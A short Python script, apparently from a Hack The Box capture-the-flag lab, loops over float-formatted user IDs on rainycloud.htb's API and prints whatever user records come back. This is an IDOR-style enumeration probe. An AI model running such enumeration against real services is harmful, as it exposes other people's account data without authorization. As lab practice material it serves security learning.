#!/usr/bin/env python3

import signal
import sys
import requests

def def_handler(sig, frame):
    print("\n\n[+] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url_target = "http://rainycloud.htb/api/user/{:.1f}"

for i in range(1, 11):
    url = url_target.format(float(i))
    response = requests.get(url)

    if response.status_code == 200:
        print(f"\nRespuesta {url}: {response.json()}")
    else:
        print(f"\n[!] Eror {url}")
